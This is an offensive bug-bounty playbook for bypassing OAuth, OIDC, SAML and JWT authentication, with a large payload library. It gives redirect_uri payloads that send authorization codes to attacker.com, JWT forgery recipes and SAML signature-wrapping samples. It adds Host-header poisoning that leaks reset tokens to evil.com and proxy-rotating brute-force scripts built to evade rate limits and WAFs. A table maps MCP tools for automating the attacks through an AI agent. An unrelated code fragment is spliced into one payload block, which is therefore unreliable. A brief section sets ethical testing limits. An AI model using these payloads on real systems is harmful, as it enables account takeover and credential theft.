# OAuth / OIDC / SAML / JWT

> Perspective: black-box; the goal is to bypass authentication / forge a token / take over an account

## 1. In one sentence

OAuth/OIDC/SAML outsource "authentication" to a third-party IdP; JWT is a commonly used token format.
SRC value: being able to forge any user's identity = P0; being able to make the callback send the code to an attacker's domain = P0.

---

## 2. High-frequency entry points

```
/oauth/authorize
/oauth2/authorize
/oauth/token
/connect/authorize
/.well-known/openid-configuration
/saml/login
/saml/acs
/jwks.json
/.well-known/jwks.json
Post-login Authorization: Bearer eyJ...   (JWT)
Callback: ?code=xxx&state=xxx
```

---

## 3. Probing techniques

### 3.1 OAuth redirect_uri validation

```bash
# 1. Substring-matching vulnerability
?redirect_uri=https://target.com.attacker.com
?redirect_uri=https://attacker.com/target.com
?redirect_uri=https://target.com.evil.com

# 2. Path bypass
?redirect_uri=https://target.com/../attacker.com/cb
?redirect_uri=https://target.com@attacker.com
?redirect_uri=https://target.com#@attacker.com
?redirect_uri=https://target.com%2f@attacker.com
?redirect_uri=https://target.com%5c@attacker.com

# 3. URL-parsing differences
?redirect_uri=https://attacker.com\@target.com
?redirect_uri=https://attacker.com%2f%40target.com/cb

# 4. Wildcard / subdomain
?redirect_uri=https://attacker.target.com    (if *.target.com is allowed)

# 5. Case / encoding
?redirect_uri=HTTPS://target.com.attacker.com
?redirect_uri=https://target.com%2eattacker.com

# 6. Empty / missing
?redirect_uri=
?redirect_uri  (no value)

# 7. CRLF
?redirect_uri=https://target.com%0d%0aLocation:%20https://attacker.com
```

If it works → the `code` is sent to the attacker's callback → exchange the code for a token.

### 3.2 Missing state / nonce

```
# Do not send state
?response_type=code&client_id=xxx&redirect_uri=...

# The mechanism: missing state → CSRF login-binding attack
1. The attacker obtains a code on the IdP with their own account
2. Induce the victim to visit /callback?code=ATTACKER_CODE
3. The victim gets bound to the attacker's account
```

### 3.3 Missing PKCE (mobile / SPA)

```
Normal: code_challenge / code_verifier
Attack: after intercepting the code, still being able to exchange for a token without a verifier = PKCE disabled

Test:
1. Check whether the authorization request has a code_challenge parameter
2. If not → after intercepting the code, exchange with the attacker's code_verifier (actually it works without a verifier)
```

### 3.4 JWT vulnerability probes

```bash
# 1. alg=none
{"alg":"none","typ":"JWT"}.{...payload...}.   ← empty signature
echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0
echo -n '{"sub":"admin"}' | base64 -w0
Assemble the token: <header>.<payload>.

# 2. HS/RS confusion
# Normally uses RS256 (public key + private key), change to HS256 (shared secret)
# Use the leaked public key (or n+e in jwks) as the HMAC secret to forge

python3 jwt_tool.py -X k -pk public.pem JWT

# 3. Weak-key brute force
hashcat -m 16500 jwt.txt rockyou.txt
john --format=HMAC-SHA256 jwt.txt --wordlist=rockyou.txt

# 4. kid path traversal / SQL injection
{"alg":"HS256","kid":"../../../dev/null"}      → use an empty file as the key
{"alg":"HS256","kid":"key1' UNION SELECT 'attacker_secret'--"}

# 5. jku injection (external JWKS)
{"alg":"RS256","jku":"https://attacker.com/jwks.json"}
# The attacker controls the JWKS → provides their own public key → forge the token

# 6. x5u injection (external certificate)
{"alg":"RS256","x5u":"https://attacker.com/cert.pem"}

# 7. None casing
"alg":"None"  /  "alg":"NONE"  /  "alg":"nOnE"

# 8. Empty signature
Delete the signature segment directly, leaving header.payload. (keep the dot)
```

Tools:
- `jwt_tool` (https://github.com/ticarpi/jwt_tool)
- `jwt.io` (manual editing)
- Burp `JWT Editor` plugin

### 3.5 SAML attacks

```xml
<!-- XSW (XML Signature Wrapping) -->
<!-- Wrap the malicious assertion outside / inside / as a sibling of the signed assertion -->

<samlp:Response>
  <saml:Assertion Signed>
    <saml:Subject>victim</saml:Subject>      ← signed
  </saml:Assertion>
  <saml:Assertion>
    <saml:Subject>admin</saml:Subject>        ← unsigned, but the application may use this one
  </saml:Assertion>
</samlp:Response>

<!-- KeyInfo injection -->
<!-- Generate your own key pair, stuff the X.509 certificate into KeyInfo -->

<!-- Recipient/Audience/InResponseTo not validated -->
<!-- Response not signed (only the Assertion is signed) -->
```

Tool: `SAMLRaider` (Burp plugin).

### 3.6 OIDC discovery probe

```bash
curl https://target/.well-known/openid-configuration

# Check whether jwks_uri can be externally controlled
# Check whether issuer can be changed
# Check whether alg=none is allowed
```

---

## 4. Bypass matrix

| Blocked by | Bypass |
|---|---|
| redirect_uri literal comparison | substring, @ character, URL encoding, CRLF, subdomain |
| state required | check whether it is actually validated or just a placeholder |
| PKCE must be enabled | check whether the authorization request actually carries a code_challenge |
| JWT alg=RS256 | change to HS256 using the public key; change to alg=none |
| Server validates the jku domain | DNS Rebinding |
| SAML Response signature verification | XSW wrapping / modify the unsigned node |
| Device-code rate limit | rotate multiple client_ids |

---

## 5. Exploitation for escalation / lateral

```
redirect_uri bypass → code goes to attacker → exchange for token → use token to call the API
missing state → CSRF login binding → victim's data attributed to the attacker's account
JWT forgery → any user identity → backend, API all compromised
SAML XSW → change the Subject to admin → directly enter the admin backend
```

---

## 6. Real-case fingerprints

| Case | One-liner |
|------|------|
| Slack OAuth | `redirect_uri` substring validation, bypass by adding `@` |
| Microsoft OAuth | `redirect_uri` reported multiple times |
| Auth0 | missing `state` leading to CSRF |
| Multiple SaaS | `kid` path traversal to `/dev/null` |
| A Java SAML implementation | XSW attack |
| OWASP JuiceShop | JWT alg=none |

Common fingerprints:
- The authorization request accepts `redirect_uri=https://target.com@evil.com` without erroring → vulnerability
- The JWT header contains `"alg":"RS256"`; changing it to `"alg":"none"` and the application still accepts it → P0
- The JWKS endpoint returns a `kid` list, and the application allows any `kid` to be chosen → forgery
- The SAML Response's `Recipient` is not validated → replay

---

## 7. Reproduction / evidence essentials

### 7.1 PoC template (redirect_uri bypass)

```
# 1. Trigger authorization
GET /oauth/authorize?client_id=xxx&response_type=code&redirect_uri=https://target.com@attacker.com/cb&state=1

# 2. The browser redirects to
Location: https://target.com@attacker.com/cb?code=AUTHCODE&state=1

# 3. The attacker receives the code
attacker.com log:
  GET /cb?code=AUTHCODE&state=1

# 4. Exchange the code for a token
POST /oauth/token
grant_type=authorization_code&code=AUTHCODE&redirect_uri=...&client_id=xxx&client_secret=...

→ obtaining the access_token is proof; do not actually call the business API
```

### 7.2 PoC template (JWT alg=none)

```
Original JWT:
eyJhbGciOiJSUzI1NiIs...

Forged (alg=none, sub=admin):
echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0     → eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
echo -n '{"sub":"admin","exp":9999999999}' | base64 -w0 → eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0
Assemble: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.

Request:
Authorization: Bearer <forged token>

→ the server responds 200 + admin-privilege content (redacted screenshot)
```

### 7.3 CVSS

```
redirect_uri bypass → account takeover     = 8.1 / 9.1 High–Critical
missing state → login-binding CSRF          = 6.1
missing PKCE (mobile)                        = 5.4
JWT alg=none                                 = 9.8 Critical
JWT HS/RS confusion                          = 9.8 Critical
SAML XSW                                     = 9.8 Critical
```

### 7.4 Impact section

```
Via the redirect_uri parameter of the /oauth/authorize endpoint, using the form `https://target.com@attacker.com/cb`
bypasses domain validation, directing the authorization code to an attacker-controlled domain. The attacker can:
1. Induce the victim to click a malicious authorization link;
2. After the victim completes login at the IdP, the code is sent to attacker.com;
3. The attacker exchanges the code for an access_token, completely taking over the victim's account.

During testing, two attacker-controlled accounts were used (both the attacker and the "victim" are researcher accounts);
no real users were involved.
```

---

## Related MCP tools

In practice, jshookmcp can be invoked for automation. **The default `search` profile does not pre-load tools; before invoking, first activate with `mcp__jshook__activate_tools <tool_name>`** (see [`../tools/mcp-jshook.md`](../tools/mcp-jshook.md) §recommended profile).

| Tool | Domain | When to invoke |
|---|---|---|
| `mcp__jshook__network_extract_auth` | network | automatically extract JWT / OAuth token / cookie from captured traffic |
| `mcp__jshook__binary_encode` + `mcp__jshook__binary_decode` | encoding | rewrite the JWT header / payload base64, handling the signature segment separately |
| `mcp__jshook__network_replay_request` | network | modify redirect_uri / state / nonce and replay |
| `mcp__jshook__debugger_evaluate` | debugger | trace the SAML assertion / JWT parsing logic in the frontend |
| `mcp__jshook__detect_crypto` + `mcp__jshook__crypto_extract_standalone` | core / transform | extract the signature function for offline recomputation |

Full mapping: [`../tools/mcp-jshook.md`](../tools/mcp-jshook.md)

## 8. Things not to do

- **Forbidden**: using a redirect_uri bypass to actually capture a real user's code (even inducing a friend to click is not allowed). Demonstrate with your own two accounts.
- **Forbidden**: actually operating the admin backend (delete, modify, create) after forging an admin JWT. Only prove 200 + admin content.
- **Forbidden**: performing actual high-privilege operations after a SAML XSW.
- **Forbidden**: hosting a real jwks online for a long time in a jku-injection PoC (delete it after use).
- **Restriction**: perform JWT brute-forcing only offline on a token you obtained; do not attack the IdP online.

## H1 real cases

_A total of 240 disclosed HackerOne High/Critical reports hit this category, sorted by (bounty + votes×100), taking the Top 12_

| Severity | $ | Program | Title (click for the original report) | Summary |
|---|--:|---|---|---|
| Critical | — | Shopify | [Takeover an account that doesn't have a Shopify ID and more](https://hackerone.com/reports/867513) | Details The https://pos-channel.shopifycloud.com/graphql-proxy/admin can be exploited to update a staff member email without an… |
| Critical | — | Shopify | [Email Confirmation Bypass in myshop.myshopify.com that Leads to Full Privilege Escalation to Any …](https://hackerone.com/reports/791775) | I told Pete I would take a look at Spotify, hi Pete. Summary It's possible to take over any store account through bypassing the… |
| Critical | — | Snapchat | [Improper Authentication - any user can login as other user with otp/logout & otp/login](https://hackerone.com/reports/921780) | '/scauth/otp/droid/logout' request contains user_id parameter. Usually it is equal to current user user_id, but if an attacker … |
| Critical | — | Shopify | [[Part II] Email Confirmation Bypass in myshop.myshopify.com that Leads to Full Privilege Escalation](https://hackerone.com/reports/796808) | Summary In #791775, I submitted a bug at Sunday 5pm Canada time, it was triaged two hours later, and I got the **temp** fix mes… |
| Critical | — | Flickr | [Flickr Account Takeover using AWS Cognito API](https://hackerone.com/reports/1342088) | Flickr uses Amazon Cognito to implement its login functionality. Furthermore, Flickr does not allow users to change their regis… |
| High | — | Uber | [Chained Bugs to Leak Victim's Uber's FB Oauth Token](https://hackerone.com/reports/202781) | Chained Bugs to Leak Victim's Uber's FB Oauth Token |
| Critical | 15000 usd | TikTok | [Incorrect authorization to the intelbot service leading to ticket information](https://hackerone.com/reports/1328546) | Incorrect authorization to the intelbot service leading to ticket information |
| High | 10500 usd | Superhuman (formerly Grammarly) | [Ability to DOS any organization's SSO and open up the door to account takeovers](https://hackerone.com/reports/976603) | Summary:** There's an interesting issue I've spent quite a few days trying to escalate but can't figure out |
| High | 13000 usd | Stripe | [Mass Accounts Takeover Without any user Interaction  at https://app.taxjar.com/](https://hackerone.com/reports/1685970) | Mass Accounts Takeover Without any user Interaction at https://app.taxjar.com/ |
| High | 7500 usd | Snapchat | [Stealing SSO Login Tokens (snappublisher.snapchat.com)](https://hackerone.com/reports/265943) | Description Attacker can steal SSO login tokens for snappublisher.snapchat.com by chaining different flaws in SSO and Snapchat’… |
| High | — | X / xAI | [Bypass Password Authentication for updating email and phone number - Security Vulnerability](https://hackerone.com/reports/770504) | Summary:** [Additional requirement for authentication is an extra layer of security for a person's Twitter account |
| Critical | 12000 usd | TikTok | [Account Takeover via Authentication Bypass in TikTok Account Recovery](https://hackerone.com/reports/2443228) | Account Takeover via Authentication Bypass in TikTok Account Recovery |

**Weakness distribution for hits in this category:**

- Improper Authentication - Generic: 123 entries
- Uncategorized → manually classified: 30 entries
- Cryptographic Issues - Generic: 18 entries
- Improper Certificate Validation: 12 entries
- Authentication Bypass Using an Alternate Path or Channel: 12 entries
- Open Redirect: 10 entries
- Insufficient Session Expiration: 4 entries
- Reliance on Cookies without Validation and Integrity Checking in a Security Decision: 3 entries
- Authentication Bypass by Primary Weakness: 2 entries
- Missing Required Cryptographic Step: 2 entries
- Authentication Bypass: 2 entries
- Use of Hard-coded Cryptographic Key: 2 entries
- Key Exchange without Entity Authentication: 2 entries
- Reliance on Untrusted Inputs in a Security Decision: 2 entries
- Use of a Broken or Risky Cryptographic Algorithm: 2 entries
- Session Fixation: 2 entries
- Storing Passwords in a Recoverable Format: 2 entries
- Plaintext Storage of a Password: 2 entries
- Unverified Password Change: 2 entries
- Use of Insufficiently Random Values: 1 entry
- Missing Critical Step in Authentication: 1 entry
- Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG): 1 entry
- Weak Cryptography for Passwords: 1 entry
- Reusing a Nonce, Key Pair in Encryption: 1 entry
- Use of a Key Past its Expiration Date: 1 entry

## Payload library

_17 structured web payloads, including full attack chains + WAF/EDR bypass variants_

**Category distribution:** Authentication vulnerabilities (10) · JWT security (4) · Open redirect (3)

### · Authentication vulnerabilities

### Authentication bypass  `auth-bypass`
Web application authentication-bypass techniques
Sub-category: **authentication bypass** · tags: `auth` `bypass` `authentication`

**Prerequisites:** the target has an authentication mechanism; the authentication implementation has flaws

**Attack chain:**

**1. SQL-injection bypass**
_SQL injection to bypass login_
```
admin'--
admin' OR '1'='1
```

**2. Array bypass**
_PHP array bypass_
```
user[]=admin&pass[]=admin
```

**3. Type casting**
_Type-casting bypass_
```
# PHP type-casting bypass - array and type confusion:
# 1. Array bypass of password comparison (strcmp bypass):
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

user=admin&pass[]=1
# strcmp(array, string) returns NULL in PHP, and NULL == 0 is true

# 2. Loose-comparison bypass:
POST /login HTTP/1.1
Content-Type: application/json,

        syntaxBreakdown: [
          { part: ''', explanation: { zh: 'Close quote', en: 'Close quote' }, type: 'char' },
          { part: 'OR', explanation: { zh: 'Logical OR', en: 'Logical OR' }, type: 'keyword' },
          { part: '--', explanation: { zh: 'SQL comment', en: 'SQL comment' }, type: 'operator' }
        ]
{"user":"admin","pass":true}
# true == "any_string" is true in PHP loose comparison

# 3. Numeric-string bypass:
{"user":"admin","pass":0}
# 0 == "password_string" is true in PHP (PHP < 8.0)
```

**4. JSON bypass**
_NoSQL bypass_
```
{"user":"admin","pass":{"$ne":""}}
```

**5. IP forgery**
_IP-forgery bypass_
```
X-Forwarded-For: 127.0.0.1
X-Original-URL: /admin
```

**6. HTTP method**
_HTTP-method bypass_
```
# HTTP-method tampering to bypass authentication:
# 1. Try different HTTP methods:
curl -X POST "http://target.com/admin" -v
curl -X PUT "http://target.com/admin" -v
curl -X PATCH "http://target.com/admin" -v
curl -X DELETE "http://target.com/admin" -v
curl -X OPTIONS "http://target.com/admin" -v

# 2. Method-override headers:
curl -X POST -H "X-HTTP-Method-Override: PUT" "http://target.com/admin"
curl -X POST -H "X-Method-Override: DELETE" "http://target.com/admin"

# 3. URL path-traversal bypass:
curl "http://target.com/admin/..;/admin"
curl "http://target.com/;/admin"
curl "http://target.com/%2e%2e/admin"
```

**WAF/EDR bypass variants:**

**1. HTTP-method tampering and path normalization**
_Use non-standard HTTP methods or method-override headers to bypass method-based access control, and use URL-path casing, double slashes, dots, encoding, etc. normalization differences to bypass path matching_
```
# HTTP-method tampering:
GET /admin HTTP/1.1 → 403
POST /admin HTTP/1.1 → 200
PATCH /admin HTTP/1.1
OPTIONS /admin HTTP/1.1
X-HTTP-Method: PUT
X-HTTP-Method-Override: DELETE

# Path normalization:
/admin → 403
/ADMIN → 200
/admin/ → 200
//admin → 200
/./admin → 200
/admin..;/ → 200
/%61dmin → 200
```

**2. HTTP/2 pseudo-headers and request splitting**
_Use HTTP/2 pseudo-headers (:path, etc.) or the X-Original-URL/X-Rewrite-URL headers to override the request path to bypass reverse-proxy ACLs, and use IP-forgery headers to bypass source-based authentication_
```
# HTTP/2 pseudo-header bypass:
:method: GET
:path: /admin
:authority: target.com
X-Original-URL: /admin
X-Rewrite-URL: /admin

# Header injection:
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-Host: localhost
```

---

### Brute force  `auth-brute`
Automated password-guessing attack
Sub-category: **brute force** · tags: `auth` `brute-force` `password`

**Prerequisites:** no CAPTCHA; no lockout policy

**Attack chain:**

**1. Pitchfork**
_Brute-force multiple fields simultaneously_
```
Burp Intruder: Pitchfork mode
```

**2. Cluster bomb**
_Cartesian-product brute force_
```
Burp Intruder: Cluster bomb mode
```

**3. Response-difference-based username enumeration**  _[linux]_
_Distinguish valid from invalid usernames by differences in response status code / length / time_
```
# Enumerate valid usernames via response length/time differences
# Compare responses of valid vs invalid usernames:
curl -s -o /dev/null -w "user=admin: code=%{http_code} size=%{size_download} time=%{time_total}s"   -d "username=admin&password=wrong" "http://target.com/login"

curl -s -o /dev/null -w "user=xxxxx: code=%{http_code} size=%{size_download} time=%{time_total}s"   -d "username=nonexistent_user_xxxxx&password=wrong" "http://target.com/login"

# Batch enumeration (note response differences):
for user in $(cat /usr/share/seclists/Usernames/top-usernames-shortlist.txt); do
  resp=$(curl -s -o /tmp/resp.txt -w "%{http_code}:%{size_download}:%{time_total}"     -d "username=${user}&password=test" "http://target.com/login")
  echo "${user}: ${resp}"
  sleep 1
done
```

**4. CAPTCHA/OTP brute force and bypass**
_Brute force and various logic bypasses targeting OTP verification codes_
```
# Scenario 1: 4-6 digit numeric CAPTCHA brute force
# Detect whether the CAPTCHA has a rate limit:
for i in $(seq 1 10); do
  code=$(printf "%06d" $RANDOM | cut -c1-6)
  resp=$(curl -s -o /dev/null -w "%{http_code}"     -d "otp=${code}" "http://target.com/verify-otp")
  echo "Attempt ${i}: otp=${code} → HTTP ${resp}"
done

# Scenario 2: bypass the frontend CAPTCHA check by modifying the response
# Capture and modify the response {"success":false} → {"success":true}

# Scenario 3: CAPTCHA reuse (the same CAPTCHA is valid multiple times)
# After obtaining a CAPTCHA, use the same CAPTCHA to try different accounts

# Scenario 4: CAPTCHA leaked in the response
curl -v -d "phone=13800138000&action=send_code" "http://target.com/api/sms"
# Check whether the response headers/body contain the CAPTCHA
```

**5. Distributed brute force and IP rotation**
_Use a proxy pool to rotate IPs to avoid being banned, performing distributed brute force_
```
# Use a proxy pool for distributed brute forcing:
import requests
import itertools
from concurrent.futures import ThreadPoolExecutor

TARGET = "http://target.com/login"
proxies_list = open("proxies.txt").read().splitlines()
usernames = ["admin", "administrator", "root", "test"]
passwords = open("/usr/share/wordlists/rockyou-top1000.txt").read().splitlines()

proxy_cycle = itertools.cycle(proxies_list)

def try_login(combo):
    user, pwd = combo
    proxy = next(proxy_cycle)
    try:
        r = requests.post(TARGET,
            data={"username": user, "password": pwd},
            proxies={"http": proxy, "https": proxy},
            timeout=10,
            headers={"User-Agent": f"Mozilla/5.0 (rv:{hash(proxy)%90+10}.0)"}
        )
        if r.status_code == 302 or "dashboard" in r.text.lower():
            print(f"[+] FOUND: {user}:{pwd} via {proxy}")
            return (user, pwd)
    except: pass
    return None

combos = [(u,p) for u in usernames for p in passwords]
with ThreadPoolExecutor(max_workers=5) as pool:
    results = list(pool.map(try_login, combos))
    found = [r for r in results if r]
    for f in found: print(f"[+] Valid: {f[0]}:{f[1]}")
```

**WAF/EDR bypass variants:**

**1. Rate-limit bypass (HTTP-header forgery)**
_Bypass IP-based rate limiting by forging HTTP headers such as X-Forwarded-For_
```
# Bypass IP-based rate limiting by forging IP headers:
import requests
import random

TARGET = "http://target.com/login"
headers_rotation = [
    "X-Forwarded-For", "X-Real-IP", "X-Originating-IP",
    "X-Remote-Addr", "X-Client-IP", "X-Remote-IP",
    "CF-Connecting-IP", "True-Client-IP", "Forwarded"
]

def brute_with_header_bypass(username, password):
    fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    h = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    for header in headers_rotation:
        h[header] = fake_ip
    r = requests.post(TARGET, data={"username": username, "password": password}, headers=h, timeout=10)
    return r

# Use a different forged IP for each request
passwords = ["admin", "123456", "password", "admin123", "root"]
for pwd in passwords:
    r = brute_with_header_bypass("admin", pwd)
    print(f"admin:{pwd} → {r.status_code} ({len(r.text)})")
```

**2. Parameter pollution and casing bypass**
_Bypass the WAF's brute-force detection via parameter pollution, format switching, and encoding obfuscation_
```
# Parameter-pollution bypass:
# Normal request (rate-limited):
curl -d "username=admin&password=test" "http://target.com/login"

# Parameter duplication (some backends take the last value):
curl -d "username=admin&username=admin&password=test" "http://target.com/login"

# JSON-format switching (if supported):
curl -H "Content-Type: application/json"   -d '{"username":"admin","password":"test"}' "http://target.com/login"

# Casing obfuscation:
curl -d "Username=admin&Password=test" "http://target.com/login"
curl -d "USERNAME=admin&PASSWORD=test" "http://target.com/login"

# Unicode obfuscation:
curl -d "username=admin&password=test" "http://target.com/login"

# Extra-parameter injection:
curl -d "username=admin&password=test&captcha=&token=" "http://target.com/login"

# Different encoding:
curl -d "username=admin&password=test" "http://target.com/login" -H "Content-Type: application/x-www-form-urlencoded; charset=IBM037"
```

---

### Session hijacking  `auth-session`
Use session-management flaws to hijack or forge a user's session and obtain unauthorized access
Sub-category: **session management** · tags: `auth` `session` `hijack`

**Prerequisites:** the target uses Cookie- or Token-based session management; the session identifier can be intercepted or predicted; network communication is not fully encrypted (HTTP) or XSS exists

**Attack chain:**

**1. Session-Cookie attribute analysis**  _[linux]_
_Analyze the security-attribute configuration of the target's session Cookie_
```
# Detect Cookie security attributes
curl -v "http://target.com/login" 2>&1 | grep -i "set-cookie"

# Check key attributes:
# - HttpOnly: prevents JS from reading the Cookie
# - Secure: transmitted only over HTTPS
# - SameSite: prevents CSRF
# - Path/Domain: Cookie scope
# - Expires/Max-Age: session lifetime

# Batch-analyze Cookies:
curl -c - "http://target.com/login" -d "user=test&pass=test" 2>/dev/null | tail -5
```

**2. Session fixation attack (Session Fixation)**  _[linux]_
_Preset a sessionId so that after the victim logs in the attacker can reuse that session_
```
# 1. The attacker obtains a valid sessionId
curl -c cookies.txt "http://target.com/"
cat cookies.txt | grep -i "session|jsession|phpsess"

# 2. Construct a link containing the fixed sessionId to lure the victim to log in
# http://target.com/login;jsessionid=ATTACKER_SESSION_ID
# Or via Set-Cookie injection:
# http://target.com/page?lang=en%0d%0aSet-Cookie:%20PHPSESSID=FIXED_SESSION

# 3. After the victim logs in with that sessionId, the attacker directly uses the same sessionId
curl -b "PHPSESSID=FIXED_SESSION" "http://target.com/dashboard"
```

**3. Session hijacking (HTTP sniffing)**  _[linux]_
_Intercept the session Cookie in unencrypted HTTP communication_
```
# Sniff HTTP Cookies on the same network (requires a man-in-the-middle position)
# Use Wireshark filter:
http.cookie contains "session" or http.cookie contains "PHPSESSID"

# Or use tcpdump:
tcpdump -i eth0 -A -s 0 'port 80 and (tcp[((tcp[12:1]&0xf0)>>2):4] = 0x436F6F6B)'

# After obtaining the Cookie, use it directly:
curl -b "PHPSESSID=STOLEN_SESSION_ID" "http://target.com/admin/dashboard"
```

**4. Session prediction (weak randomness)**  _[linux]_
_Collect multiple sessionIds to analyze the generation pattern and predict a valid session identifier_
```
# Batch-collect sessionIds to analyze the pattern
for i in $(seq 1 20); do
  sid=$(curl -sI "http://target.com/" | grep -i "set-cookie" | grep -oP "(?<=PHPSESSID=)[^;]+")
  echo "$i: $sid"
  sleep 0.5
done

# Use Burp Suite Sequencer to analyze randomness
# Or analyze with Python:
# python3 -c "
# import hashlib, time
# # If the sessionId is based on a timestamp:
# for t in range(int(time.time())-100, int(time.time())+100):
#     predicted = hashlib.md5(str(t).encode()).hexdigest()
#     print(predicted)
# "
```

**WAF/EDR bypass variants:**

**1. Cookie Jar overflow and Cookie Tossing**
_Squeeze out the legitimate session Cookie by setting a large number of Cookies to exceed the browser's storage limit, or use subdomain privileges to inject a malicious Cookie into the parent domain to achieve session overwrite_
```
# Cookie Jar overflow:
# Set a large number of Cookies (exceeding the browser limit ~50) to squeeze out old Cookies:
for(let i=0;i<700;i++){document.cookie=`c${i}=x;domain=.target.com`}
# After the original session Cookie is squeezed out, inject the attacker's session

# Cookie Tossing (subdomain injection):
# Set a Cookie from subdomain.target.com:
document.cookie="session=ATTACKER_SID;domain=.target.com;path=/"
# This Cookie also takes effect on the main domain target.com
```

**2. SameSite bypass and cross-site session leak**
_Use the property that SameSite=Lax allows top-level navigation GET requests to carry the Cookie, initiating credentialed cross-site requests via link clicks or window.open_
```
# SameSite=Lax bypass (top-level navigation GET request carries the Cookie):
<a href="http://target.com/api/transfer?to=attacker&amount=1000">click</a>
# In Lax mode, GET requests carry the Cookie

# SameSite=None exploitation (requires Secure):
# If SameSite=None is set but the Secure attribute is missing:
# Chrome rejects it, but old browsers may accept it

# Bypass via window.open:
window.open("http://target.com/api/userinfo")
# The new window is a top-level navigation; in Lax mode it carries the Cookie
```

---

### Password-reset vulnerability  `auth-password-reset`
Bypass the password-reset flow
Sub-category: **logic vulnerability** · tags: `auth` `password-reset` `logic`

**Prerequisites:** the password-reset feature has a logic flaw

**Attack chain:**

**1. Host-header poisoning**
_The reset link points to the attacker's domain_
```
# Host-header poisoning to hijack the password-reset link:
# 1. Basic Host-header poisoning:
POST /forgot-password HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
# The reset link becomes: http://evil.com/reset?token=xxx

# 2. X-Forwarded-Host poisoning:
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

email=victim@target.com

# 3. Double Host header:
POST /forgot-password HTTP/1.1
Host: target.com
Host: evil.com

email=victim@target.com

# 4. Verify via Burp Collaborator:
Host: BURP-COLLABORATOR-ID.burpcollaborator.net
```

**2. Token brute force**
_Verification code too short_
```
# Password-reset verification-code brute force:
# 1. Send the reset-code request:
curl -d "email=victim@target.com" "http://target.com/forgot-password"

# 2. Four-digit numeric code brute force (0000-9999):
# Burp Intruder setup:
POST /reset-password HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=victim@target.com&code=§0000§
# Payload: Numbers, From 0, To 9999, Min/Max 4 digits

# 3. Six-digit code brute force (takes more time):
import requests
for code in range(0, 999999):
    r = requests.post('http://target.com/reset-password',
        data={'email':'victim@target.com','code':f'{code:06d}'})
    if 'success' in r.text or r.status_code == 302:
        print(f'Valid code: {code:06d}')
        break
```

**3. Password-reset token predictability analysis**
_Analyze the generation pattern of the password-reset token to determine whether it is predictable_
```
# Batch-request password-reset tokens to analyze the pattern:
import requests
import time
import hashlib

tokens = []
for i in range(10):
    r = requests.post("http://target.com/api/password-reset",
        data={"email": f"test{i}@example.com"})
    # Obtain the token from the email API or the response
    if "token" in r.text:
        import json
        token = json.loads(r.text).get("token", "")
        tokens.append({"time": time.time(), "token": token})
        print(f"Token {i}: {token}")
    time.sleep(0.5)

# Analyze the Token pattern:
for i, t in enumerate(tokens):
    print(f"Token {i}: len={len(t['token'])}, "
          f"hex={'yes' if all(c in '0123456789abcdef' for c in t['token'].lower()) else 'no'}, "
          f"time={t['time']}")

# Check whether it is based on a timestamp:
for ts in range(int(tokens[0]['time'])-5, int(tokens[0]['time'])+5):
    candidate = hashlib.md5(str(ts).encode()).hexdigest()
    if candidate == tokens[0]['token']:
        print(f"[+] Token is MD5(timestamp)! Predictable!")
```

**4. Password-reset flow logic flaws**
_Test various logic vulnerabilities in the password-reset flow_
```
# 1. Parameter tampering - modify the email/phone:
# Replace the recipient email when sending the reset request
curl -d "email=victim@target.com&notify_email=attacker@evil.com"   "http://target.com/api/password-reset"

# 2. IDOR - directly use another's reset Token/UID:
curl -d "token=VALID_TOKEN&uid=OTHER_USER_ID&new_password=hacked123"   "http://target.com/api/password-reset/confirm"

# 3. Step skipping - directly access the set-new-password page:
curl -d "uid=123&new_password=test12345"   "http://target.com/api/password-reset/set-password"

# 4. Token not invalidated - use an already-used Token:
curl -d "token=ALREADY_USED_TOKEN&new_password=newpass123"   "http://target.com/api/password-reset/confirm"

# 5. Password-reset poisoning (Host-header injection):
curl -H "Host: evil.com" -H "X-Forwarded-Host: evil.com"   -d "email=victim@target.com" "http://target.com/api/password-reset"
# The reset link the victim receives: http://evil.com/reset?token=xxx
```

**WAF/EDR bypass variants:**

**1. Multiple Host-header-poisoning variants**
_Multiple WAF-bypass variants of Host-header poisoning_
```
# Standard Host-header poisoning:
curl -H "Host: evil.com" -d "email=victim@target.com" "http://target.com/forgot"

# X-Forwarded-Host (often trusted by web frameworks):
curl -H "X-Forwarded-Host: evil.com" -d "email=victim@target.com" "http://target.com/forgot"

# Multiple Host headers:
curl -H "Host: target.com" -H "Host: evil.com" -d "email=victim@target.com" "http://target.com/forgot"

# Inject a port into Host:
curl -H "Host: target.com@evil.com" -d "email=victim@target.com" "http://target.com/forgot"
curl -H "Host: target.com:evil.com" -d "email=victim@target.com" "http://target.com/forgot"

# Absolute URL overriding Host:
curl "http://target.com/forgot" -H "Host: evil.com" --request-target "http://target.com/forgot"

# X-Original-URL / X-Rewrite-URL:
curl -H "X-Original-URL: /forgot" -H "Host: evil.com" "http://target.com/forgot"
```

**2. Reset-token brute-force rate-limit bypass**
_Bypass the rate limit for reset-token brute forcing via IP-header rotation and UA randomization_
```
# IP rotation to bypass the rate limit:
import requests
import random

def try_token(token, proxy=None):
    headers = {
        "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}",
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ])
    }
    r = requests.post("http://target.com/reset-password",
        data={"token": token, "new_password": "Test123!"},
        headers=headers, timeout=10)
    return r.status_code != 400

